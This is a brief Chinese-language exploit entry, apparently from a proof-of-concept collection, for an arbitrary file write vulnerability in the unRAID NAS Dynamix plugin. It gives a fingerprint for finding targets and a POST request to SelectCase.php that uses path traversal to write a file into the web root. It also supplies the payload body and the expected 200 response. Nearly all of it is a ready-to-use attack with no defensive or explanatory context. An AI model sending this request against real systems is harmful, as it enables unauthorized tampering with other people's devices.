# NAS设备unraidDynamix插件任意文件写入漏洞

NAS ｜ 任意文件读取/写入 ｜ —
- **指纹**：`"/webGui/images/banner.png"`
- **请求**：`POST /plugins/dynamix/include/SelectCase.php?file=../../../../usr/local/emhttp/dudesite.txt HTTP/1.1`

**Payload**
```
csrf_token=9855BE5478D13A31&mode=set&model=Bypass 2021
```
- **响应特征**：200